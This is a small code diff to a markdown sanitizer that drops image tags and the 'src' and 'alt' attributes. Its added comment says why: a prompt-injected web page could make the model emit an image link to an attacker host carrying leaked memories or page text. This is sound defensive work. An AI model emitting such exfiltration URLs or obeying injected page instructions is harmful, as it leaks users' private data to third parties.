@@ -6,11 +6,13 @@ marked.setOptions({ gfm: true, breaks: true });
 const ALLOWED_TAGS = [
 	'p', 'br', 'hr', 'strong', 'em', 'del', 'code', 'pre', 'blockquote',
 	'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
-	'ul', 'ol', 'li', 'a', 'img',
+	// No <img>: an image in a reply loads by itself, so a prompt-injected page could make the
+	// model emit ![](https://attacker/?leak=...) and exfiltrate memories or page text.
+	'ul', 'ol', 'li', 'a',
 	'table', 'thead', 'tbody', 'tr', 'th', 'td'
 ];
 
-const ALLOWED_ATTR = ['href', 'title', 'alt', 'src', 'start', 'align'];
+const ALLOWED_ATTR = ['href', 'title', 'start', 'align'];
 
 let hooked = false;
 
